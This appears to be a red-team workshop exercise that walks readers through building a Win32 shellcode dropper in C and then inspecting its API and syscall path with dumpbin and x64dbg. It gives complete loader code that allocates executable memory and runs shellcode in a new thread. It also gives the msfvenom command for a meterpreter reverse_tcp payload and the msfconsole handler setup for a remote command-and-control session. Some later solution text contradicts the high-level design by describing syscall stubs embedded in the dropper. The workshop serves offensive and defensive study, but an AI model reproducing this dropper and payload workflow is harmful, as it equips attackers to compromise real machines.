## Exercise 2: Win32 Dropper
In **Exercise 2** we will create our first shellcode dropper based on **high level APIs** or **Win32 APIs**. This dropper will more or less be the reference for further development into a direct syscall and indirect syscall dropper. Later in this text we call the Dropper High-Level-Dropper. If you look at the figure below, you will see that we do not use direct or indirect syscalls at all. Instead we use the normal legitimate way like ``malware.exe -> Win32 APIs (kernel32.dll) -> Native APIs (ntdll.dll) -> syscall``.  
![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)


## Exercise 2 tasks:
### Creating the Win32 Dropper
1. Download the Win32 dropper POC from the Code section of this chapter.
2. In this case the code is already implemented in the POC. Your first task is to create x64 meterpreter shellcode and copy it into the POC.  
3. Compile the POC as a x64 release. 
4. Create and run a staged x64 meterpreter listener using msfconsole.
5. Run your compiled .exe and check that a stable command and control channel opens. 
### Analysing the Direct Syscall Dropper
6. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
7. Use **x64dbg** to debug or analyse the dropper. 
     - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
     - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?


## Visual Studio
You can download the POC from the code section of this chapter. The technical functionality of the High-Level-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the High-Level-Dropper or Win32-Dropper into a Low-Level-Dropper using direct system calls. In the Win32 dropper we use the following Win32 APIs 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject

The code works like this. First, we need to define the thread function for shellcode execution later in the code.
<details>
    
```
// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}
```
 </details> 
 

Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
<details>
    
```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>

    
The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
<details>
    
```
// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
 </details>   


The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
<details>

```
// Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
```
</details>
    

Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
<details>
    
```
// Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
```
</details>

    
And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
<details>  
    
```
// Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);    
```
</details>    

    
Here is the **complete code**, but you can also find it already implemented in the code POC of this chapter.
<details>
    
```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```
</details>

    
## Meterpreter Shellcode
In this step, we will create our meterpreter shellcode for the High-Level-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
**kali>**       
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>
    
The shellcode can then be copied into the High-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>
    

## MSF-Listener
Before we test the functionality of our High-Level-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>


## High-Level-Dropper analysis: dumpbin
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>
    
**cmd>**  
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
</details>
    
<details>
    <summary>Solution</summary>   
In the case of the High-Level-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the High-Level-Dropper from the kernel32.dll.
<p align="center">
<img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
</p>
</details>

    
## High-Level-Dropper analysis: x64dbg
The first step is to run your win32 dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the win32 dropper directly in x64dbg you need to run the assembly first.
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/1d7959d0-9a35-451d-be18-826f4a832737">
</p>            
</details>    


First we want to check which APIs (Win32 or Native) or if the correct APIs are being imported and from which module or memory location. 
Remember that no direct syscalls or similar are used in the Win32 dropper. What results do you expect?
     
<details>
    <summary>Solution</summary>
Checking the imported symbols in our Win32 dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83">   
<img width="800" alt="image" src="[https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83](https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/facd43e5-6cb6-44b7-b17b-0dfd8faab28a)">
</p>        
We use the "Follow imported address" function in the Symbols tab by right-clicking on one of the four Win32 APIs used, e.g. Virtual Alloc, and we can see that we jump to the location of kernel32.dll.
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/55b64891-6e31-4f1b-b566-30489fb41c7b">
</p>
In the next step we use the function Follow in Dissassembler to follow the memory address that jumps to the memory of the kernelbase.dll.  
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/fa540f58-b748-45c7-9ee0-4f55821709f7">
</p> 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/992e3162-84cc-480b-ade9-e17d6541ba48">
</p>
Then we use the Follow in dissassembler function again and follow the address that calls the native function Nt* or ZwAllocateVirtualMemory from a memory location in ntdll.dll      
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/667441cb-d9ae-43d3-969e-35be8dbab5da">
</p>        
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/456e8c76-32bc-4115-8154-61630a8e87c5">
</p>
As expected, we go the normal way via ``malware.exe`` -> ``kernel32.dll`` -> ``kernelbase.dll`` -> ``ntdll.dll`` -> ``syscall``.     
</details>     

     

     
     
     
     

In case of e.g. VirutalAlloc we use the follow in dump function in x64dbg and we can see, we can see that as expected we have the transition from kernel32.dll (Virtual Alloc) -> to kernelbase.dll 
     We can also see that instead of asking ntdll.dll for the four native functions used, they are implemented directly in the assembly in the .text region. 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/e2b2b167-7d52-41ec-8d93-c6f0da4ae958">
</p>       
</details>
We also want to check from which module or memory location the syscall stub of the native functions used is implemented, and also check from which module or memory location the syscall statement and return statement are executed.
<details>
    <summary>Solution</summary>
     In the context of the native function ``NtAllocateVirutalMemory``, we follow in the disassembler and should be able to see that the syscall stub is not retrieved from ntdll.dll, instead the stub is implemented directly into the .text section of the assembly. We can also see that the syscall statement and the return statement are executed from the memory location of the syscall dropper assembly.    
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/f78a51a0-fdc8-4c19-8d4b-924024c9dc5b">
</p>       
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/462e794c-1a4f-4bd8-9375-8d503941caa3">
</p>       
</details>     
     
     
     
     
     
     
     
     
     
     
     
     
     
     
Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
Remember, so far we have not implemented any native APIs or system calls or system call stubs directly in the dropper. What results would you expect?
<details>
    <summary>Solution</summary>
    
1. Open or load your High-Level-Dropper.exe into x64dbg
2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
    
<p align="center">    
<img width="867" alt="image" src="https://user-images.githubusercontent.com/50073731/235445644-240e5c3b-a3cf-4a7a-99be-27412e2dcb82.png">
</p>
    
As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are correctly executed/imported from the .text section in the ntdll.dll module. This investigation is very important because later in the direct syscall exercise we expect a different result with the low level dropper and want to match it.
    
<p align="center">    
<img width="686" alt="image" src="https://user-images.githubusercontent.com/50073731/235445865-c3fe83fa-1539-4ff3-b850-96cc91a0a01d.png">
</p>    
</details>

    
## Summary: High-level API Dropper
- No direct system calls at all
- Syscall execution over normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
- Dropper imports VirtualAlloc from kernel32.dll...
- ...then imports NtAllocateVirtualMemory from ntdll.dll...
- ...and finally executes the corresponding syscall or syscall stub

